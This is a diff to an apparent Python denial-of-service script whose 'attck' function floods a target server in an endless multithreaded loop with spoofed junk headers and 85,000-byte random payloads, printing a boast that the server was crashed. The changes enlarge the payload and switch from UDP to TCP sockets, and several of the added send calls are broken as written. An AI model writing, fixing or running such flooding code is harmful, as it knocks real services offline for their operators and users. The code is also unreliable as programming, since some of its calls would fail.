@@ -878,22 +878,25 @@ def start():
             s.close()
             print('[+] server error')
 def attck():
-  global userip,socks5
-  data3 = random._urandom(5000)
+  global userip,socks5,ref
+  data3 = random._urandom(85000)
   xx = int(0)
   anjgall = "Anjing: "+random.choice(userip)+random.choice(socks5)+"\r\n"
-  content = "Content-Type: application/x-www-form-urlencoded\r\n"
+  content = "Content-Type: application/x-www-form-urlencoded"+"\r\n"
   length  = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
-  main_req = anjgall + content + length + "\r\n"
+  lolanjg = "refall"+random.choice(ref)+random.choice(userip)+random.choice(socks5)+"\r\n"
+  main_req = anjgall + lolanjg + content + length + "\r\n"
   while True:
         try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((str(ip),int(port)))
             s.send(str.encode(main_req))
-            s.send(str.encode(data3))
+            s.sendto((main_req))
+            s.send((data3))
             for i in range(pack):
                 s.send(str.encode(main_req))
-                s.send(str.encode(data3))
+                s.sendto((main_req))
+                s.sendto((data3))
             xx += random.randint(0, int(pack))
             print("SÉRVÉR {1} CRÂSH BY ZÁN")
         except:
@@ -905,6 +908,6 @@ for bj in range(th):
    thred2 = threading.Thread(target=attck)
    thred.start()
    thred2.start()
-for y in range(75000):
+for y in range(7500):
     thred.join()
     thred2.join()
